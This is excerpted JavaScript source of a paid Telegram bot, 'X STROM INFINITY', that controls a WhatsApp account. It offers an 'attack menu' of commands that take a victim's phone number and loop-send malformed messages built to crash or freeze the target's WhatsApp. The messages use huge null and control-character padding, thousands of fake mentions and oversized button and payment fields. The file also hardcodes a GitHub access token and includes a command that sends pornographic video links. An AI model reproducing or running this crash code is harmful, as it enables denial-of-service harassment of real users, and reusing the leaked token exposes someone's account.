...
const OWNER = "SASUKEXDEVBOS"; 
const REPO = "token";
const TOKEN_FILE = "token.json"; 
const GITHUB_TOKEN = "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";

const databaseUrl = `https://raw.githubusercontent.com/SASUKEXDEVBOS/token/refs/heads/main/token.json`;
...
const thumbnailUrl = "https://files.catbox.moe/rk6b05.png";
const StartUrl = "https://files.catbox.moe/rk6b05.png";
const menuUrl = "https://files.catbox.moe/rk6b05.png";
const bugUrl = "https://files.catbox.moe/rk6b05.png";
const toolsUrl = "https://files.catbox.moe/rk6b05.png";
const tqtoUrl = "https://files.catbox.moe/rk6b05.png";
const attackUrl = "https://files.catbox.moe/rk6b05.png";
...
Reason: ${reason}`;
  ...
  console.log("\x1b[41m\x1b[37m[🔐 PROTECTION]\x1b[0 ACTIVE 🔥\n");
}
...
│BELI AKSES SILAHKAN PV @SASUKEXDEV
═―————————————―—═⬡
  `));
    activateSecureMode();
    hardExit(1);
...
┏────────────────────────┓
│╭━( INFORMASI )
┃女 Developer : @SASUKEXDEV
┃女 channell : @sasukeXteam
┗────────────────────────┛
`));
...
├───────────────────────────────
│⟢ NANTIKAN SELALU UPDATE DARI X STROM
╰─❖──────────────────────────❖─╯
  `));
        }
...
bot.command("addbot", async (ctx) => {
  ...
  try {
    ...
    const code = await sock.requestPairingCode(phoneNumber, "SASKESAD");
...
bot.use(async (ctx, next) => {
    ...
    if (!isOwnerPresent) {
        await ctx.reply(`MALU ANJING MALIMG BOT BEGO😹 BUY @SASUKEXDEV.`, { parse_mode: "Markdown" });
...
let styleIndex = 0;
let menuAnimation = null; // Penampung interval biar gak bentrok
...
bot.start(async (ctx) => {
    ...
    const menuMessage = `<blockquote><tg-emoji emoji-id="4940998718838014973">💀</tg-emoji> 𝐗 𝐒𝐓𝐑𝐎𝐌 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="4987984647443973182">🪙</tg-emoji>
...
<tg-emoji emoji-id="4936468614967460670">⭐</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝐗 𝐒𝐓𝐑𝐎𝐌 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘
<tg-emoji emoji-id="4936468614967460670">⭐</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 11.0
<tg-emoji emoji-id="4936468614967460670">⭐</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @SASUKEXDEV
...
<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> شكرًا لاستخدامك هذا البرنامج النصي. استخدمه استخدامًا حسنًا، ولا تسيء استخدامه لأن ذلك قد يؤدي إلى عقوبات وفقًا للقانون. <tg-emoji emoji-id="5465206035729906349">🐈‍⬛</tg-emoji>
    ...
    const getDiscoButtons = () => {
        const style = styles[styleIndex];
        styleIndex = (styleIndex + 1) % styles.length;
        return {
            inline_keyboard: [
       [
          { text: "⌜🛠⌟ ᴛᴏᴏʟs ᴍᴇɴᴜ", callback_data: "/controls", style: style, icon_custom_emoji_id: "5303467248218821710" },
          { text: "⌜🦠⌟ ᴀᴛᴛᴀᴄᴋ ᴍᴇɴᴜ", callback_data: "/bug", style: style, icon_custom_emoji_id: "5303144893743389410" }
       ],
       [
          { text: "⌜🔱⌟ ᴏᴡɴᴇʀ ᴍᴇɴᴜ", callback_data: "/owner", style: style, icon_custom_emoji_id: "5303415751560949335" },
          { text: "⌜❤⌟ ᴛǫ ᴛᴏ", callback_data: "/tqto", style: style, icon_custom_emoji_id: "5303060407441705875" }
       ],
       [
          { text: "⌜👑⌟ ᴅᴇᴠᴇʟᴏᴘᴇʀ", url: "https://t.me/SASUKEXDEV", style: style, icon_custom_emoji_id: "5303464142957468790" },
          { text: "⌜🔆⌟ ɪɴғᴏʀᴍᴀsɪ sᴄʀɪᴘᴛ", url: "https://t.me/sasukeXteam", style: style, icon_custom_emoji_id: "5303467248218821710" }
       ]
     ]
   };
 };
    ...
    if (ctx.callbackQuery) {
        // Jika dari tombol (Edit Menu) - Hanya edit caption foto
        await ctx.editMessageCaption(teks, {          
            parse_mode: "HTML", 
            reply_markup: getDiscoButtons() 
        }).then((msg) => {
            handleDisco(ctx, msg, getDiscoButtons);
        }).catch(() => {});
    } else {
       
        await ctx.replyWithPhoto({ url: StartUrl }, { 
            caption: menuMessage,
            parse_mode: "HTML", 
            reply_markup: getDiscoButtons() 
        }).then((msg) => {
...
// Fungsi Helper biar gak numpuk kodenya
function handleDisco(ctx, msg, getDiscoButtons) {
    if (!msg) return;
...
<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> شكرًا لاستخدامك هذا البرنامج النصي. استخدمه استخدامًا حسنًا، ولا تسيء استخدامه لأن ذلك قد يؤدي إلى عقوبات وفقًا للقانون. <tg-emoji emoji-id="5465206035729906349">🐈‍⬛</tg-emoji>
    ...
    try {
        // INI CARA GANTI FOTO DAN TEKS BARENGAN
        ...
        console.log("Gagal ganti foto menu 2:", e.message);
    }
 } catch (error) {
   console.log("Error di action start:", error.message);
   }
});
...
<blockquote><b>𖤓 /checkupdate - check update
𖤓 /update - auto update
𖤓 /addbot - Add Sender
𖤓 /setcd - Set Cooldown
𖤓 /killbot - Reset Session
𖤓 /claim - Claim Premium 30d
...
bot.action('/bug', async (ctx) => {
    const isPrivate = ctx.chat?.type === 'private';
  const CONFETTI_ID = "5046509860389126442";
    const bug3Menu = `<blockquote>╭━〔 𝗔𝗧𝗧𝗔𝗖𝗞 𝗠𝗘𝗡𝗨 〕━━━━━━━━━╮
│𖤓 /crasher  ➜ 𝙳𝙴𝙻𝙰𝚈 𝙷𝙰𝚁𝙳
│𖤓 /exitdelay ➜ 𝙵𝚁𝙴𝙴𝚉𝙴
│𖤓 /Xkerslay ➜ 𝚂𝚃𝚄𝙲𝙺 𝙻𝙾𝙶𝙾
│𖤓 /Sockers ➜ 𝙳𝙴𝙻𝙰𝚈 𝚅𝙸𝚂𝙸𝙱𝙻𝙴
│𖤓 /Scrot ➜ 𝙳𝙴𝙻𝙰𝚈 𝙱𝚄𝙻𝙳𝙾𝚉𝙴𝚁
│𖤓 /CursedSock ➜ 𝙱𝙴𝙱𝙰𝚂 𝚂𝙿𝙰𝙼
│𖤓 /Xdelay ➜ 𝙱𝙴𝙱𝙰𝚂 𝚂𝙿𝙰𝙼
...
〣 @SASUKEXDEV - 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁
〣 @SASUKENOTDEV1 - 𝙼𝚈 𝙻𝙾𝚅𝙴𝙴
〣 @Ramji_822 - 𝙼𝚈 𝙵𝚁𝙸𝙴𝙽𝙳
〣 @Ambakikuk - 𝙼𝚈 𝙵𝚁𝙸𝙴𝙽𝙳
〣 @sukihandsome - 𝙼𝚈 𝙵𝚁𝙸𝙴𝙽𝙳
〣 @dittajayaww - 𝙼𝚈 𝙵𝚁𝙸𝙴𝙽𝙳
〣 @NandoOfficiali - 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽 𝚂𝙸𝚂𝚃𝙴𝙼
〣 @LexzyMods - 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽 𝚂𝙸𝚂𝚃𝙴𝙼
    ...
    if (data.startsWith('addprem_')) {
        ...
        try {
            await ctx.telegram.sendMessage(
                userId,
                `🎉 <b>Selamat!</b>\n` +
                `Anda sekarang pengguna Premium X STROM!\n` +
                `• Durasi: ${duration} hari\n` +
                `• Berakhir: ${expiryDate}`,
                { parse_mode: "HTML" }
            );
...
const GH_OWNER = "SASUKEXDEVBOS";
const GH_REPO = "AUTO-UPDATES";
...
bot.command("sendbokep", async (ctx) => {
  try {
    const videoList = [
      ...
      "https://files.catbox.moe/8mwdqc.mp4",
      "https://files.catbox.moe/5fl2jm.mp4",
      "https://files.catbox.moe/jos2v7.mp4",
      "https://files.catbox.moe/7js0zg.mp4",
      "https://files.catbox.moe/biz0pm.mp4",
      "https://files.catbox.moe/7ru4si.mp4",
      "https://files.catbox.moe/ptmcjf.mp4",
      "https://files.catbox.moe/vcvfyz.mp4",
      "https://files.catbox.moe/g7ggno.mp4",
      "https://files.catbox.moe/i7uxwg.mp4",
      "https://files.catbox.moe/w4d1r2.mp4",
      "https://files.catbox.moe/khla8l.mp4",
      "https://files.catbox.moe/z4judq.mp4",
      "https://files.catbox.moe/0l2k1t.mp4",
      "https://files.catbox.moe/6fqz6j.mp4",
      "https://files.catbox.moe/42sly5.mp4",
      "https://files.catbox.moe/6eucd2.mp4",
      "https://files.catbox.moe/eyone7.mp4"
    ];
...
© X STROM INFINITY`, { parse_mode: "HTML" })
...
◉ Status : sᴜᴋsᴇs
────────────────────
[ 𝐗 𝐒𝐓𝐑𝐎𝐌 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 ⌟</pre>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
       { text: "𝙲𝙷𝙴𝙲𝙺 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${number}`, style: "Primary"},
      ]]
    }    
  });
...
bot.command("exitdelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /exitdelay 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
...
`,
    ...
    reply_markup: {
      inline_keyboard: [[
       { text: "𝙲𝙷𝙴𝙲𝙺 𝚃𝙰𝚁𝙶𝙴𝚃ཀ͜͡", url: `https://wa.me/${number}`, style: "Primary"},
      ]]
    }    
  });
  ...
  for (let i = 0; i < speed; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await PorkLosTempi(sock, target);
  }
});

bot.command("Xkerslay", checkWhatsAppConnection, checkPremium, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /Xkerslay 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
...
`,
  ...
  for (let i = 0; i < speed; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await LexzyModssV1New(sock, target);
  }
});

bot.command("Sockers", checkWhatsAppConnection, checkPremium, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /Sockers 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
...
bot.command("Scrot", checkWhatsAppConnection, checkPremium, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /Scrot 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
...
bot.command("CursedSock", checkWhatsAppConnection, checkPremium, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /CursedSock 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
...
bot.command("Xlayx", checkWhatsAppConnection, checkPremium, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /Xlayx 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
...
//------------- FUNCTION BUG -------------///.
async function PorkLosTempi(sock, target) {
  const CrBHitS = {
...
async function LexzyModssV1New(sock, target) {
  for (let i = 0; i < 5; i++) {
    var message = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            nativeFlowResponseMessage: {
              ...
              paramsJson: "\x10".repeat(75000),
              version: 3
            },
            contextInfo: {
              participant: "11146680002@s.whatsapp.net",
              remoteJid: target,
      ...
      message: {
        groupMentionMessage: {
          message: {
            interactiveResponseMessage: {
              contextInfo: {
                remoteJid: target,  // sebelumnya "target" (string), sekarang variabel
                mentionedJid: ["13135560002@s.whatsapp.net"],
              },
              body: {
              ...
              nativeFlowResponseMessage: {
                ...
                paramsJson: JSON.stringify({
                  values: {
                    in_pin_code: "x",
                    building_name: "executedteam",
                    address: "/LexzyModss - Executed¿!",
                    tower_number: "xxx",
                    city: "LexzyModss",
                    name: "ExecutedTeam",
                    phone_number: "x",
                    house_number: "x",
                    floor_number: "x",
                    state: "\u0000".repeat(75000)  // tetap menghasilkan null berulang
                  }
                }),
                version: 3,
              },
  ...
  const LexxMsg = generateWAMessageFromContent(target,
    {
      viewOnceMessage: {
        message: {
          ephemeralMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "NanasMuda - Executed¿!" + "\u0003".repeat(7500) + "ೄྀ".repeat(5000)
                },
                contextInfo: {
                  remoteJid: target,
                  ...
                  businessMessageForwardInfo: {
                    businessOwnerJid: "13135560002@s.whatsapp.net"
                  },
                  mentionedJid: [
                    target,
                    "1@s.whatsapp.net",
                    ...
                    ...Array.from({ length: 1999 }, () =>
                      `${Math.floor(100000 + Math.random() * 8999999)}@s.whatsapp.net`
                    )
                  ]
                }
              }
  ...
  await sock.relayMessage("status@broadcast", ExtMsg, {
    messageId: undefined,
  ...
  await sock.relayMessage("status@broadcast", LexxMsg, {
    messageId: LexxMsg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "META AI",
    ...
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          ...
          {
            name: "cta_call",
            buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(9000) }),
          },
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(9000) }),
          ...
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'ꦾ'.repeat(75000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"LexzyModss","key":"${'\u0000'.repeat(9000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
...
//END FUNCTION ELU KNTL
  
const GITHUB_RAW_URL = "https://raw.githubusercontent.com/SASUKEXDEVBOS/token/refs/heads/main/token.json";
